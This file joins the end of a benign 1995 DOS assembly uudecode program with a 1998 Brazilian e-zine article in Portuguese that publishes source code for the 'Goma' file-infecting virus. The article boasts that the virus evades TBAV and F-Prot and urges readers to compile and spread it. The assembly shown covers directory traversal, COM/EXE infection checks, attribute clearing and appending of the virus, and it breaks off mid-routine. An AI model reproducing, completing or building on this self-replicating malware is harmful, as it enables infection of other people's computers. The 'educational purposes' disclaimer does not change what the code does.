              INT       21h                 ;close input file
@@test_outf:  MOV       AL, CH
              AND       AL, 02h
              JZ        @@rtn
              MOV       AH, 3Eh
              MOV       BX, of_handle
              INT       21h                 ;close output file
              JNC       @@rtn
              CMP       CL, 04h
              JNE       @@rtn               ;skip if msg already displayed
              MOV       BYTE PTR errno, AL
              LEA       BX, outfilename
              PUSH      BX
              CALL      disp_error          ;error closing output file

@@rtn:        POP       AX
              MOV       AL, BYTE PTR misc
              POP       DI
              POP       SI
              POP       DX
              POP       CX
              POP       BX
              ADD       SP, LOC_N
              POP       BP
              RET

decode        ENDP

;----------------------------------------------------------------------------
; end PROC decode
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC flush_obuf:
;
; flush file output buffer; called from subroutine 'decode'
;
; parameters:
;
;    DX: # of chars in output buffer
;    DI: points to next available position in obuf
;
; global variables used:
;
;    outfilename: stores output filename
;    of_handle  : file handle of output file
;    obuf       : output file buffer
;    errno      : stores error codes
;
; return value: in CH: 0 on success, 1 on error
;----------------------------------------------------------------------------

flush_obuf    PROC      NEAR

              LOCALS    @@

              PUSH      AX
              PUSH      BX
              PUSH      CX

              MOV       AH, 40h
              MOV       BX, of_handle
              MOV       CX, DX
              LEA       DX, obuf
              INT       21h                 ;write buffer to disk
              JNC       @@test_full
              MOV       BYTE PTR errno, AL  ;error writing data to disk
@@disp_msg:   LEA       BX, outfilename
              PUSH      BX
              CALL      disp_error          ;display error msg
              MOV       AL, 1               ;return 1 (error)
              JMP       SHORT @@rtn
@@test_full:  CMP       AX, CX
              JE        @@set_vars
              MOV       BYTE PTR errno, 27h ;disk full
              JMP       SHORT @@disp_msg
@@set_vars:   XOR       DX, DX              ;0 chars in obuf
              LEA       DI, obuf            ;[DI] = start of obuf
              MOV       AL, DL              ;return 0 (success)

@@rtn:        POP       CX
              MOV       CH, AL
              POP       BX
              POP       AX
              RET

flush_obuf    ENDP

;----------------------------------------------------------------------------
; end PROC flush_obuf
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC find_begin:
;
; find begin line; pass back output filename in outfilename
;
; global variables used:
;
;    outfilename: used to store output filename (taken from begin line)
;    line_ptr   : ptr to lines read from input file
;
; return value: in AL: 0 on success, -1 on 'no begin line', -2 on 'unknown
;                      file format', -3 on error reading from disk; if
;                      subroutine returns -3, errno will contain the proper
;                      error code on exit
;----------------------------------------------------------------------------

find_begin    PROC      NEAR

              LOCALS    @@

              PUSH      CX
              PUSH      DX
              PUSH      SI
              PUSH      DI
              PUSH      AX

@@getline:    CALL      readline            ;get line from input file
              CMP       AH, -2
              JNE       @@test_lngth
              MOV       DL, -3
              JMP       @@rtn
@@test_lngth: CMP       AH, -1
              JE        @@getline
              CMP       AH, 0
              JNE       @@not_eof
              CMP       AL, 0
              JE        @@not_eof
              MOV       DL, -1              ;return value
              JMP       SHORT @@rtn         ;no begin line
@@not_eof:    CMP       AH, 5               ;
              JB        @@getline           ;line too short for 'begin'
@@find_beg:   MOV       SI, line_ptr
              LEA       DI, beg             ;string containing 'begin'
              MOV       CX, 5
              CLD                           ;clear DF for rest of subroutine
        REPE  CMPSB
              JNE       @@getline           ;loop if 1st 5 chars not 'begin'
              XOR       CH, CH              ;CX = # chars left in line ...
              MOV       CL, AH              ;
              SUB       CX, 5               ;... to scan
              MOV       DI, CX
              DEC       DI
@@scan_ws_1:  LODSB                         ;loop discards whitespace, and
              CMP       AL, SPACE           ;ends when a non-whitespace char
              LAHF                          ;has been found or the entire
              MOV       DH, AH              ;line has been scanned
              CMP       AL, TAB
              LAHF
              OR        DH, AH
              AND       DH, 40h
              LOOPNZ    @@scan_ws_1
              JNZ       @@rtn_neg_2         ;rest of line is whitespace
              JCXZ      @@rtn_neg_2         ;only 1 more non-whitespace char
              CMP       CX, DI
              JE        @@rtn_neg_2         ;no whitespace after 'begin'
              MOV       DI, CX
@@scan_mode:  CMP       AL, '0'             ;loop discards mode (digits 0-7)
              JB        @@check_num
              CMP       AL, '7'
              JA        @@check_num
              LODSB
              LOOP      @@scan_mode
              JMP       SHORT @@rtn_neg_2   ;entire line scanned
@@check_num:  CMP       CX, DI
              JE        @@rtn_neg_2         ;first char was not in (0-7)
              CMP       AL, SPACE
              JE        @@scan_ws_2
              CMP       AL, TAB
              JNE       @@rtn_neg_2         ;mode not followed by whitespace
@@scan_ws_2:  LODSB                         ;loop discards whitespace after
              CMP       AL, SPACE           ;mode digits; loop ends when non-
              LAHF                          ;whitespace char found or entire
              MOV       DH, AH              ;line scanned
              CMP       AL, TAB
              LAHF
              OR        DH, AH
              AND       DH, 40h
              LOOPNZ    @@scan_ws_2
              JZ        @@get_fname         ;rest of line not whitespace
@@rtn_neg_2:  MOV       DL, -2
              JMP       SHORT @@rtn
@@get_fname:  LEA       DI, outfilename
              STOSB                         ;store 1st char of outfilename
              JCXZ      @@add_null          ;entire line scanned
@@next_char:  LODSB                         ;loop gets rest of outfilename,
              CMP       AL, SPACE           ;and terminates when whitespace
              JE        @@add_NULL          ;char found or entire line
              CMP       AL, TAB             ;scanned
              JE        @@add_NULL
              STOSB
              LOOP      @@next_char
@@add_NULL:   XOR       AL, AL
              STOSB                         ;add terminating NULL char
              MOV       DL, AL              ;return value of 0 in DL

@@rtn:        POP       AX
              MOV       AL, DL
              POP       DI
              POP       SI
              POP       DX
              POP       CX
              RET

find_begin    ENDP

;----------------------------------------------------------------------------
; end PROC find_begin
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC readline:
;
; attempt to read a line (80 chars max) from input file; pointer to line
; (located in ibuf) is passed back in global variable line_ptr and on return,
; AL indicates whether line terminates due to EOF; in AH, function returns
; length of line which was read, or -1 if line had to be truncated to keep
; from exceeding 80 char maximum; although line is not moved from ibuf,
; ibuf_p is advanced past last char in line, and length of line is subtracted
; from ibuf_n; no terminating NULL char is added to end of line, because
; doing so could overwrite next char in ibuf
;
; global variables used:
;
;    line_ptr : on return, points to line in ibuf
;    if_handle: file handle of input file
;    ibuf     : input file buffer
;    ibuf_n   : # of chars in ibuf
;    ibuf_p   : ptr to next char in ibuf
;    errno    : stores error codes
;
; return value: in AX:
;
;                  AH: -1 if line was truncated to keep from exceeding 80
;                      char maximum; -2 if error occurred while trying to
;                      fill ibuf; else, # of chars in line; if AH = -2, errno
;                      will contain the proper error code
;                  AL: 1 if line terminated due to EOF; 0 otherwise
;----------------------------------------------------------------------------

readline      PROC      NEAR

              LOCALS    @@

              PUSH      BX
              PUSH      CX
              PUSH      DX
              PUSH      SI
              PUSH      DI

              CLD                           ;clear DF for entire subroutine
              MOV       SI, ibuf_p          ;register variable
              MOV       BX, ibuf_n          ;register variable
              CMP       BX, 82
              JAE       @@ibuf_ready        ;jump if ibuf has enough chars
              LEA       DI, ibuf
              MOV       CX, BX
        REP   MOVSB                         ;move chars to start of ibuf
              MOV       DX, DI              ;[DX] = first empty place in ibuf
              MOV       DI, BX              ;save value in BX
              MOV       AH, 3Fh
              MOV       BX, if_handle
              MOV       CX, IBUF_SIZE
              SUB       CX, DI              ;CX = # chars to read from file
              INT       21h                 ;attempt to fill ibuf
              JNC       @@rd_success
              MOV       BYTE PTR errno, AL  ;save error code
              MOV       AX, 0FE00h          ;AH = -2, AL = 0
              JMP       SHORT @@rtn         ;error reading from file
@@rd_success: MOV       BX, AX              ;# chars read in BX (ibuf_n)
              ADD       BX, DI              ;add chars already in ibuf
              LEA       SI, ibuf            ;ibuf_p points to start of ibuf
@@ibuf_ready: MOV       CX, BX
              MOV       DI, SI              ;ibuf_p in DI
              CMP       CX, 82
              JB        @@dec_CX
              MOV       CX, 82
@@dec_CX:     DEC       CX
              MOV       DX, CX              ;save value in CX
              CMP       CX, 1               ;if CX < 1, then no CR, LF
              JGE       @@here              ;signed comparison (CX may be -1)
              INC       DX                  ;DX = # chars in line (0 or 1)
              XOR       AL, AL              ;no CR, LF to strip from ibuf
              MOV       AH, DL              ;in AH, return # chars in line
              JMP       SHORT @@calc_eof
@@here:       INC       DI
@@find_CR:    DEC       DI                  ;start of loop to find CR
              MOV       AL, CR
        REPNE SCASB                         ;look for CR
              JE        @@CR_found
              INC       DX
              MOV       AH, DL              ;in AH, return # chars in line
              CMP       DX, 80              ;
              JBE       @@clear_AL          ;
              MOV       DX, 80              ;DX is 81 or 82, so set DX to 80
              MOV       AH, -1              ;ret -1 in AH: line truncated
@@clear_AL:   XOR       AL, AL              ;no CR, LF to strip from ibuf
              JMP       SHORT @@calc_eof    ;
@@CR_found:   MOV       AL, LF              ;CR found, ...
              SCASB                         ;... look for LF
              JNE       @@find_CR           ;repeat loop if LF not found
              MOV       AL, 1               ;CR, LF need to be stripped
              SUB       DX, CX
              DEC       DX                  ;DX = # chars in line (80 max)
              MOV       AH, DL              ;in AH, return # chars in line
@@calc_eof:   CMP       DX, 80              ;set LSB of DL if DX < 80 ...
              RCL       CL, 1               ;... (DX treated as unsigned)
              CMP       AL, 1               ;set LSB of CH ...
              RCL       CH, 1               ;... if AL == 0
              AND       CL, CH              ;CL = 1 if line ends due to ...
              AND       CL, 01h             ;... EOF, or 0 otherwise
              MOV       line_ptr, SI        ;[line_ptr] = 1st char in line
              ADD       SI, DX              ;update ibuf_p
              SUB       BX, DX              ;update ibuf_n
              CMP       AL, 0
              JE        @@set_AL
              ADD       SI, 2               ;strip CR, LF ...
              SUB       BX, 2               ;... from ibuf
@@set_AL:     MOV       AL, CL
              MOV       ibuf_p, SI          ;save new value for ibuf_p
              MOV       ibuf_n, BX          ;save new value for ibuf_n

@@rtn:        POP       DI
              POP       SI
              POP       DX
              POP       CX
              POP       BX
              RET

readline      ENDP

;----------------------------------------------------------------------------
; end PROC readline
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC parse_args:
;
; parse command line argument string in PSP, first converting any tabs to
; spaces and any lowercase letters to uppercase; add NULL char (ASCII value
; 0) to end of each arg; store pointers to args in array argv and store # of
; args in argc
;
; NOTE: there is no need to save and restore registers, since this will
;       always be the first subroutine that gets called
;
; parameters: none
;
; global variables used:
;
;    args: section of PSP containing command line argument string
;    argc: on exit, will equal # of args found
;    argv: on exit, will contain array of pointers to args in PSP
;----------------------------------------------------------------------------

parse_args    PROC      NEAR

              LOCALS    @@

              CLD                           ;clear DF for entire subroutine
              LEA       DI, args            ;[DI] = length byte for args str.
              XOR       CH, CH
              MOV       CL, [DI]            ;CX = # chars in args string
              JCXZ      @@clear_BX
              INC       DI                  ;[DI] = first char in args string
              MOV       SI, DI
              MOV       BX, CX              ;save CX
              MOV       DX, DI              ;save DI
@@convert:    LODSB
              CMP       AL, 'a'
              JB        @@do_tabs
              CMP       AL, 'z'
              JA        @@do_tabs
              SUB       AL, 20h             ;convert to uppercase
@@do_tabs:    CMP       AL, TAB
              JNE       @@put_char
              MOV       AL, SPACE           ;convert TAB to SPACE
@@put_char:   STOSB
              LOOP      @@convert
              MOV       DI, DX              ;restore DI
              MOV       AL, TAB
              MOV       DL, SPACE
              XCHG      AX, DX              ;SPACE in AL
              MOV       CX, BX              ;restore CX
              INC       CX
@@clear_BX:   XOR       BX, BX              ;use BX to index argv array
              MOV       DL, BL              ;NULL char in DL
@@lp:   REPE  SCASB                         ;look for next nonspace char
              JCXZ      @@lp_done           ;jump if no more nonspace chars
              DEC       DI
              MOV       argv[BX], DI        ;ptr to arg in argv
              INC       DI
              ADD       BX, 2
        REPNE SCASB                         ;look for next SPACE char
              DEC       DI
              XCHG      AX, DX              ;NULL char in AL
              STOSB                         ;add treminating NULL char
              XCHG      AX, DX              ;SPACE in AL
              JCXZ      @@lp_done           ;jump if no more space chars
              JMP       SHORT @@lp          ;continue parsing args
@@lp_done:    SHR       BL, 1
              MOV       argc, BL            ;# args found in argc
              RET

parse_args    ENDP

;----------------------------------------------------------------------------
; end PROC parse_args
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC getpath:
;
; get path from path string pointed to by parameter pathstring, combine with
; filename in DTA, and store in global variable filepath
;
; parameters on stack:
;
;    pathstring: pointer to ASCIIZ string containing path string
;
; global variables used:
;
;    dta     : DTA, which contains data about last file found
;    filepath: dir path from pathstring gets stored here
;----------------------------------------------------------------------------

getpath       PROC      NEAR

              ARG       pathstring: WORD = ARG_N

              LOCALS    @@

              PUSH      BP
              MOV       BP, SP
              PUSH      AX
              PUSH      BX
              PUSH      CX
              PUSH      DX
              PUSH      SI
              PUSH      DI

              XOR       AL, AL
              MOV       DI, pathstring
              MOV       BX, DI              ;save ptr to pathstring
              MOV       CX, 128
              CLD
        REPNE SCASB                         ;look for terminating null char
              SUB       DI, 2               ;[DI] = last char in dir path
              MOV       SI, DI
              SUB       CX, 128
              NEG       CX                  ;CX = length of pathstring + 1
              STD                           ;scan backwards from end
@@find_char:  LODSB                         ;loop searches for ':' or '\',
              CMP       AL, '\'             ;which will be last char in dir
              LAHF                          ;path; when loop exits, CX will
              MOV       DH, AH              ;equal the # of chars in dir path
              CMP       AL, ':'
              LAHF
              OR        DH, AH
              AND       DH, 40h
              LOOPZ     @@find_char
              MOV       SI, BX              ;[SI] = 1st char in pathstring
              LEA       DI, filepath
              CLD
        REP   MOVSB                         ;copy dir path into filepath
@@get_fname:  LEA       SI, dta.f_filename
              MOV       CX, 13
        REP   MOVSB                         ;copy filename into filepath

              POP       DI
              POP       SI
              POP       DX
              POP       CX
              POP       BX
              POP       AX
              POP       BP
              RET       ARG_N

getpath       ENDP

;----------------------------------------------------------------------------
; end PROC getpath
;----------------------------------------------------------------------------

;----------------------------------------------------------------------------
; PROC disp_error:
;
; display error message for file find
;
; NOTE: Since the path name which just failed is an ASCIIZ (NULL terminated)
;       string, we can't print it with function 09h of INT 21h.  This is
;       because the function expects a $ terminated string and the pathname
;       might have a $ in it.  Therefore, the string is printed by repeatedly
;       calling function 02h of INT 21h (display char).  This isn't very
;       efficient, but who cares, since all we are printing is one string.
;
; parameters on stack:
;
;    pathname: pointer to ASCIIZ string containing pathname
;
; global variables used:
;
;    errno: error code passed in this variable
;----------------------------------------------------------------------------

disp_error    PROC      NEAR

              ARG       pathname: WORD = ARG_N

              LOCALS    @@

              PUSH      BP
              MOV       BP, SP
              PUSH      AX
              PUSH      BX
              PUSH      DX

              MOV       AH, 09h
              LEA       DX, uu
              INT       21h                 ;display 'uudecode: '
              MOV       BX, pathname        ;[BX] = path string
@@do_char:    MOV       DL, [BX]            ;get char from path string
              CMP       DL, 0
              JE        @@disp_err          ;exit loop if NULL char
              MOV       AH, 02h
              INT       21h                 ;display char
              INC       BX                  ;[BX] = next char in path string
              JMP       SHORT @@do_char
@@disp_err:   MOV       AH, 09h
              XOR       BH, BH
              MOV       BL, errno
              SHL       BL, 1
              MOV       DX, errors[BX]
              INT       21h                 ;disp error msg string

              POP       DX
              POP       BX
              POP       AX
              POP       BP
              RET       ARG_N

disp_error    ENDP

;----------------------------------------------------------------------------
; end PROC disp_error
;----------------------------------------------------------------------------

usage         DB        'Usage: uudecode PATH1 [PATH2 ...]$'
uu            DB        'uudecode: $'
beg           DB        'begin'
endline       DB        'end'

no_beg        DB        ': no "begin" line', CR, LF, '$'
bad_format    DB        ': unknown file format', CR, LF, '$'
short_file    DB        ': short file', CR, LF, '$'
no_end        DB        ': no "end" line', CR, LF, '$'
msgs          DW        no_beg, bad_format, short_file, no_end

error_00h     DB        '$'
error_01h     DB        ': Invalid function code', CR, LF, '$'
error_02h     DB        ': File not found', CR, LF, '$'
error_03h     DB        ': Path not found', CR, LF, '$'
error_04h     DB        ': Too many open files', CR, LF, '$'
error_05h     DB        ': Access denied', CR, LF, '$'
error_08h     DB        ': Out of memory', CR, LF, '$'
error_0Fh     DB        ': Invalid drive', CR, LF, '$'
error_13h     DB        ': Disk is write protected', CR, LF, '$'
error_14h     DB        ': Bad disk unit', CR, LF, '$'
error_15h     DB        ': Drive not ready', CR, LF, '$'
error_17h     DB        ': CRC error', CR, LF, '$'
error_19h     DB        ': Seek error', CR, LF, '$'
error_1Ah     DB        ': Not a DOS disk', CR, LF, '$'
error_1Bh     DB        ': Sector not found', CR, LF, '$'
error_1Fh     DB        ': General failure', CR, LF, '$'
error_27h     DB        ': Disk is full', CR, LF, '$'
error_50h     DB        ': File already exists', CR, LF, '$'
error_52h     DB        ': Cannot make directory entry', CR, LF, '$'
error_54h     DB        ': Out of structures', CR, LF, '$'
errors        DW        error_00h, error_01h, error_02h, error_03h, error_04h
              DW        error_05h, error_00h, error_00h, error_08h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_0Fh, error_00h, error_00h, error_00h, error_13h
              DW        error_14h, error_15h, error_00h, error_17h, error_00h
              DW        error_19h, error_1Ah, error_1Bh, error_00h, error_00h
              DW        error_00h, error_1Fh, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_27h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_00h, error_00h, error_00h, error_00h, error_00h
              DW        error_50h, error_00h, error_52h, error_00h, error_54h
versao        DB        ' uudecode version 1.1 ', CR, LF
copyright     DB        ' Copyright 1995, David S. Peterson'

              EVENDATA
errno         DB        ?                   ;keeps track of error codes
ret_val       DB        ?                   ;exit code
argc          DB        ?                   ;# of command line args
argv          DW        64        DUP (?)   ;array of pointers to args in PSP
dta           fileinfo  ?                   ;DTA to hold FILEINFO struct
filepath      DB        138       DUP (?)   ;holds dir path of file in DTA
outfilename   DB        81        DUP (?)   ;holds filename of output file
              EVENDATA
line_ptr      DW        ?                   ;ptr to line found by readline
if_handle     DW        ?                   ;input file handle
of_handle     DW        ?                   ;output file handle
ibuf          DB        IBUF_SIZE DUP (?)   ;file input buffer
              EVENDATA
obuf          DB        OBUF_SIZE DUP (?)   ;file output buffer
              EVENDATA
ibuf_n        DW        ?                   ;# chars in ibuf
ibuf_p        DW        ?                   ;ptr to next char in ibuf

uudecode      ENDS
              END       start

;----------------------------------------------------------------------------




ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  
                               /  __           ___          
                        |  /  |  |__)  |   |  (__           
                        |/    |  |  \  |___|  ___)          

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  


  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   6 - Goma.743 (codigo-fonte) 
  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ



TXT de autoria de meu irmao que circulou juntamente com a WoH Zine numero 13 
de julho de 1998 , texto na integra sem modificacoes. 

-----------------------------------------------------------------------------
                 #  5 - Goma v¡rus versÆo 1.00 alpha  #

                  << ­ p0indexter vira garoto mau ­ >> 


Nota do autor :
---------------

     - Nunca li nada sobre direito e nem sei se publicar um fonte de um v¡rus
de computador seja crime , se for que se foda , compila logo essa porra ai em
baixo e s¢ alegria !

     - Ah o v¡rus esta publicado para fins puramente educativos .

     - Que mais antes de comear ? Sei l  acho que  s¢ isso !


                                                p0indexter 
                                                ----------

                  << ­ p0indexter vira garoto mau ­ >> 

     Bom galera , como estou meio revoltado ultimamente (por causa da facu) e 
ums bago a mais e como eu j  tinha esse projeto em andamento  um tempo atr s, desde a morte de ums manos meus , e como finalizei-o no fim desse ms
resolvi public -lo nessa ediÆo do Z­NE .
     Vou dar uma breve explanaÆo sobre o v¡rus e tudo mais , se bem que isso
 meio in£til pois o v¡rus ta a¡ ; e s¢ alegria ! :)
     Quero agradecer a toda a galera que um dia j  fez um v¡rus , vio o bago
 muito maneiro , d  uma sensaÆo inexplicavl quando voc o testa e v que
funciona ! Bom quero tambm descer o cacete na galera que acha que nÆo existem
bons v¡rus nacionais , quer exemplos , s¢ 2 bastam , os 2 brasileiros mais 
conhecidos : Leandro&Kelly e o (Del)ta . 
     Ah,outra coisa que a galera na curte sÆo os geradores de v¡rus ( coisa 
de lamah ), tudo bem concordo 100% , mas existem rotinas nas crianas que sÆo 
muito uteis ! . Quanto a fazer um gerador , sei l  o Alevirus tava tentando 
fazer um , nem sei , nem troquei idia com ele sobre isso , quem sabe pode 
ainda rolar um gerador , o de macro dele eu to ligado que j  saiu , ah o 
virus que ele publicou no QS 01 do ano passado s¢ saiu o anti-v¡rus no f-prot 
3.00 de maio , pouco tempo nÆo ? Tomara que o meu tambm demore um pouquinho 
para ter uma boa distribuiÆo .
     O virus  100% brasileiro ! Algumas rotinas , alguns "Despistadores de
flags" (tanto do tbav quanto do f-prot) , e alguns endereos de mem¢ria nÆo
sÆo meus , sÆo achados por ai e sei l  , nÆo sei os manos que publicaram ou 
os grupos , somente agradeo a quem quer que seja !
     A confecÆo de um v¡rus nÆo  tarefa f cil (esse que segue ai em baixo
(nÆo sei se eu sou cabao) mas demorou um bom tempo pra ficar pronto tipo uns 
meses (5) e olha que  um v¡rus fraquinho !
     Ah os caras do f-prot mudaram ele e ele nÆo aceita mais "STRINGS" por
isso nÆo inclu¡ rotinas para cryptografar o v¡rus , alm do que se voc quizer
e tiver algum conhecimento de ASM conseguir  incluir uma rotina dessas na 
manha , ou pega o MTE e päe ai ! Os caras do f-prot ajudam a gente muito at
tiraram da ultima versÆo o verificador de mem¢ria , s¢ alegria ! Falta s¢
o tbav tirar tambm , ah estou tentando desenvolver uma rotina para verificar
o tbmem , infelizmente ainda nÆo ta pronto e o v¡rus ta indo sem , quando eu
fizer a criana , sai no Z­NE . J  o scan sem coment rios ! 
     O v¡rus esta com os coment rios em portugus , pau no cu (sem acento seus 
pregos , v se aprende , WoH Z­NE tambm  cultura .) dos brasileiros america-
nizados , o bago  em portugus mesmo se quizer traduza , nÆo , sei l  a pa-
lavra mas acho que nÆo  traduzir , foda-se , sempre fico fudido quando pego 
um fonte , que nÆo tem coment rios , seja l  do que for ou em que linguagem .
Com os coment rios do v¡rus nÆo tenho o intuito de ensinar ASM pra ningum ,
mas  h bito e muito bom deixar coment rios nos programas .
     Ps. Ainda nÆo testei mas acho que essa xoxota nÆo infecta os 'NE' os
Novos Executaveis 32 bits do 95 ou do NT , quem quizer testar me da um toque
depois !
     Acho que  s¢ isso , e ve ai , o fonte esta a pampa , testei ele uma
porrada de vezes ,tipo o virus e'de apending , mas nao ta dando muito certo, 
que se foda vai assim mesmo , mas se tiver algo muito grave tipo ele nao
voltar pro diretorio de origem igual ta ou algo mais feio , tipo uns bug 
violento (travar tudo), por favor de um toque !


;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ReCoRtA AqUi -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
;
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;                       GOMA v¡rus versÆo 1.00 alpha  
; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
; ÿ
;
;             ... Goma para sempre seu bando de cururu ... 
;                   `A mem¢ria de Regis e Guino
;             ... Goma para sempre seu bando de cururu ... 
;
; * Quem fez : Joao Gilberto 
; E-mail : p0indexter@hotmail.com ( o "0"  zero )
;
; * Porque fiz ?
; Algo que realmente lembre meus amigos !
;
; * Notas sobre o v¡rus : 
; - Infecta COM e EXE (verifica tamanho de COM)
; - Sem flags do TBAV ( Pelo menos no fonte compilado ! )
; - Nada na heur¡stica do F-prot (3.00)
; - Scan ? Piada ! Como disse o Alevirus ( isso  anti-v¡rus ?!!? )
; - Sem malef¡cios , sem data de ativaÆo , sem destruiÆo .
; - O v¡rus apenas se multiplica ! ( como dizem os Nuke , sou cat¢lico ! :) )
; 
; * Ah , os fontes sÆo unicamente para fins educativos !
; - Evite compila-lo ( use o TASM 3 :) ) 
;       - Tasm virus.asm /m  (/m -> permite infeccoes = ? )
;       - TLink virus.obj /t (/t -> COM)
;
; * Fica a seu critrio , inclusÆo de mais rotinas e os caraio a 4 , se tiver
; alguma que ache muito louca mesmo , päe ai e me manda pra eu dar uma anali-
; zada !
;
; * 3 Meses at sair um anti-v¡rus ( Aproveite ! )
; 
;  Mano ja faz cara o ja saiu no F_PROT faz um tempinho ja ! Mas ta valendo , 
;  vale os comentarios do virus.
;
;                                                         t + p0indexter

Virus   segment byte public
        assume  cs: Virus
        org     100h          ; O v¡rus vai ser .COM

id      =       'GR'          ; ID dos "EXE" Infectados

Inicio:
        mov      Infeccoes, 0 ; Limpa o contador das infeccoes = 0
        call     proximo

Proximo:   
        nop                   ; Ha,ha,S¢ um charme !  
        pop     bp
        sub     bp, offset Proximo

        push    cs
        push    cs
        pop     ds
        pop     es

        mov     ah, 47h
        xor     dl, dl
        lea     si, [bp+offset Dir_origem+1] ; Salva o diret¢rio de origem
        int     21h

        push    es            ; Novo DTA
        push    ds
        mov     ah, 1Ah
        lea     dx, [bp+offset NovoDTA]
        int     21h

        lea     di, [bp+offset origCSIP2]  ; Para salvar os EXE
        lea     si, [bp+offset origCSIP]
        mov     cx, 4
        rep     movsw

        mov     byte ptr [bp+Infeccoes], 0

traverse_loop:
        lea     dx, [bp+offset exe_spec]   ; Procurar arquivos EXE
        mov     ah, 4Eh
        call    Infectar
        lea     dx, [bp+offset com_spec]   ; Procurar arquivos COM
        mov     ah, 4Eh
        call    Infectar

        mov     ah, 3Bh       ; Cair para a Raiz (C:\>)
        lea     dx, [bp+offset Raiz]
        int     21h
        jnc     traverse_loop

Sai_traverse:
        lea     dx, [bp+offset Dir_origem] ; Voltar ao diret¢rio original
        mov     ah, 3Bh
        int     21h

        pop     ds            ; Volta DTA
        pop     es
        mov     ah, 1Ah
        mov     dx, 80h
        int     21h

        cmp     sp, id        ;  EXE?
        jne     Infectar      ; entÆo infecta !! :)

Restaurar_exe:                ; Restaurar EXE
        mov     ax, ds
        add     ax, 10h
        add     cs:[bp+word ptr origCSIP2+2], ax
        add     ax, cs:[bp+word ptr origSPSS2]
        cli
        mov     ss, ax
        mov     sp, cs:[bp+word ptr origSPSS2+2]
        sti
        db      00EAh         ; Pule para o c¢digo de origem

origCSIP2       db      ?
origSPSS2       dd      ?
origCSIP        db      ?
origSPSS        dd      ?

tres_bytes      db      0CDh, 20h, 0

Restaurar_com:                ; Restaurar COM
        mov     di, 100h
        push    di
        lea     si, [bp+offset tres_bytes]
        movsw
        movsb

return: ret                   ; Volte para o c¢digo original

Infectar:
        mov     cx, 7
        mov     ah, 4Eh       ; Encontrar o 1§ arquivo
                              
Proximo_arq:
        int     21h
        jc      return

        lea     dx, [bp+NovoDTA+30]        ; Ver os attributos do arquivo
        mov     ax, 4300h                  ; "attrib" do DOS manja ? 
        int     21h
        jc      return
        push    cx            ; Salva os atributos ( depois restaurar  )
        push    dx

        mov     ax, 4300h     ; Limpar os atributos ("+R" nÆo consigo alterar)
        inc     al
        push    ax
        xor     cx, cx
        int     21h

        mov     ax, 3D02h     ; Abrir aquivo para ler/alterar
        lea     dx, [bp+NovoDTA+30]
        int     21h
        xchg    ax, bx

        mov     ax, 5700h     ; Ver a data e o hor rio do arquivo
        int     21h
        push    cx            ; Salvar data e hora 
        push    dx

        mov     ah, 3Fh
        mov     cx, 1Ah       ; Lendo o arquivo 
        lea     dx, [bp+offset leiabuffer]
        int     21h

        mov     ax, 4202h     ; Indo com o ponteiro para o fim do arquivo 
        xor     cx, cx
        cwd
        int     21h

        mov     cx, word ptr [bp+offset leiabuffer+1]
        add     cx, Pilha-Inicio+3          ; CX = Tamanho do arquivo
        cmp     ax, cx
        jz      Ja_infectado  ; J  esta infectado ?

        cmp     ax, 65535-(Fim_da_Pilha-Inicio) ; Vai dar estouro de divisÆo ?
                                            ; (o COM vai ficar muito grande ?)
        ja      Ja_infectado

        lea     di, [bp+offset tres_bytes]  ; Salve os 3 §s bytes 
        lea     si, [bp+offset leiabuffer]
        movsb
        movsw

        mov     cx, 3                       ; C¢digo para o v¡rus
        sub     ax, cx
        mov     word ptr [bp+offset leiabuffer+1], ax
        mov     dl, 0E9h
        mov     byte ptr [bp+offset leiabuffer], dl
        jmp     short continue_Infectar

checkexe:
        cmp     word ptr [bp+offset leiabuffer+10h], id
        jnz     Vacilada     ; NÆo esta infectado, nÆo vacila, Infecte !!! :) 

Ja_infectado:
        jmp     Fechar        ; J  Infectado . Feche o arquivo .

Vacilada:  
        lea     di, [bp+origCSIP]
        lea     si, [bp+leiabuffer+14h]
        movsw                 ; Salvar CS e IP
        movsw

        sub     si, 0Ah       ; Salvar SS e SP
        movsw
        movsw

        push    bx            ; Nome do arquivo 
        mov     bx, word ptr [bp+leiabuffer+8]  ; Tamanho do Header 
        mov     cl, 4
        shl     bx, cl

